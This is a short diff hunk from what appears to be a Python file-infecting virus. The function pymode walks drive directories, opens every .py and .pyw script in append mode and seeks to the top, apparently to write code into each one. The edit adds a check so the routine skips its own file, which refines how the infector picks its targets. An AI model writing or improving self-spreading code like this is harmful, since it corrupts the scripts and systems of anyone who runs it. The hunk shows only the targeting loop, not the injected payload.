@@ -29,7 +29,7 @@ def pymode(name,letter):
         for file in files:
             try:
                 file = file.strip("\n").strip("\r")
-                if file[-3:] == ".py" or file[-4:] == ".pyw":
+                if (file[-3:] == ".py" or file[-4:] == ".pyw") and file!=name:
                     file = os.path.join(root,file)
                     f = open(file,"a+")
                     f.seek(0) #Goto the top of the file
